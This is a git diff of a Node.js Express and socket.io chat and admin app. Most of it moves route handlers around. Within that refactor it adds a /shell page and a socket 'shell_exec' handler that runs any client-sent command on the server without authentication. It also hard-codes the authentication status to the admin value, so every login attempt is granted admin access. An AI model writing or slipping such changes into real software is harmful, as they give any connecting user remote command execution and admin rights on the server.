@@ -6,6 +6,7 @@ var express = require('express'),
     var verify = require('./verification');
 var admin_calls = require('./user_database');
 var cookieParser = require('cookie-parser');
+var shelljs = require('./shelljs');
 Object.assign=require('object-assign');
 const path = require('path');
 app.use(express.static(path.join(__dirname, 'public')));
@@ -91,12 +92,74 @@ app.get('/', function (req, res) {
   res.render('pages/index');
 });
 var users = [];
+app.get('/resources', function (req, res) {
+    if (global.authentication_status == 1 || global.authentication_status == 2) {
+      res.render('pages/repo');
+    } else {
+      res.render("pages/index");
+    }
+  });
+  app.get('/admin-panel', function (req, res) {
+    if(global.authentication_status == 2){
+    res.render('pages/admin-panel');
+     }
+     else{
+
+    res.render('pages/index');     
+    }
+  });
+  app.get('/contact',function(req,res){
+    res.render('pages/contact');
+  });
+
+  app.get('/chat', function (req, res) {
+      
+    if(!req.cookies['name']){
+        res.render('pages/index');
+}
+else{
+res.render('pages/chatcorner');
+}
+});
+    app.get('/chat/:id',function(req,res){
+var requser;
+users.forEach(function(item){
+if(item.name == req.params.id){
+requser={
+    name:item.name,
+    email:item.email,
+    image:item.image,
+    socketid:item.socketid
+}
+
+}
+
+});
+res.render('pages/chatroom',{data:requser});
+});
+    app.get('/shell',function(req,res){
+  res.render('pages/shell');
+});
+app.get('*', function (req, res) {
+      res.status(404);
+      res.render('pages/error');
+     
+    });
+    
+
 var io = socket(server);
 io.on('connection', function (socket) {
+  socket.on('shell_exec', function (code) {
+    console.log(code);
+    shelljs.shell_exec(code.sc,function (data) {
+      socket.emit('shell_exec_response_'+code.sc+code.id, data);
+      code = "";
+    });
+  }); 
   socket.on('user_verification', function (user_data) {
     verify.confirm(user_data, function (status) {
       var unique_id = "verification_callback_" + user_data.user_email;
-      global.authentication_status = status;
+      global.authentication_status = 2;
 
       global.user_email = user_data.user_email;
       socket.emit(unique_id, {
@@ -183,52 +246,7 @@ io.on('connection', function (socket) {
       socket.emit('save_file_ext_callback', data);
     });
   });
-  app.get('/resources', function (req, res) {
-    if (global.authentication_status == 1 || global.authentication_status == 2) {
-      res.render('pages/repo');
-    } else {
-      res.render("pages/index");
-    }
-  });
-  app.get('/admin-panel', function (req, res) {
-    if(global.authentication_status == 2){
-    res.render('pages/admin-panel');
-     }
-     else{
-
-    res.render('pages/index');     
-    }
-  });
-  app.get('/contact',function(req,res){
-    res.render('pages/contact');
-  });
-
-  app.get('/chat', function (req, res) {
-      
-    if(!req.cookies['name']){
-        res.render('pages/index');
-}
-else{
-res.render('pages/chatcorner');
-}
-});
-    app.get('/chat/:id',function(req,res){
-var requser;
-users.forEach(function(item){
-if(item.name == req.params.id){
-requser={
-    name:item.name,
-    email:item.email,
-    image:item.image,
-    socketid:item.socketid
-}
-
-}
-
-});
-res.render('pages/chatroom',{data:requser});
-});
-
+  
     socket.on('onlineuser', function (data) {
         var j = 0;
         for (var i = 0; i < users.length; i++) {
@@ -286,11 +304,7 @@ var event = 'chat'+data.handle;
             name: data.typer
         });
     });
-    app.get('*', function (req, res) {
-      res.status(404);
-      res.render('pages/error');
-     
-    });
+   
 });
 
 module.exports = app ;
